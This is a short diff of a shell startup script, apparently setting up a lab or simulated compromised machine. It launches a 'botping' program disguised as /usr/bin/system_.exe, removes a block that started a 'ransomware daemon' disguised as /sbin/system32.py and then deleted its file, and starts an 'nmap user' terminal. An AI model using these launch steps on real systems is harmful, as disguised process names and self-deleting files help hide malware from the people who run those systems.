@@ -1,3 +1,7 @@
+bash setup_1.bash
+
+sleep 20
+
 # start botping process
 #cp bot_ping.py /usr/bin/system_.exe
 /usr/bin/system_.exe &
@@ -6,12 +10,6 @@ echo "running system_"
 
 sleep 5
 
-# start ransomware daemon
-#cp ransom_server.py /sbin/system32.py
-#python2 /sbin/system32.py &
-/sbin/system32.py &
-sleep 5
-rm /sbin/system32.py
 
 # start nmap user
 getty -a fred_1 tty15 &
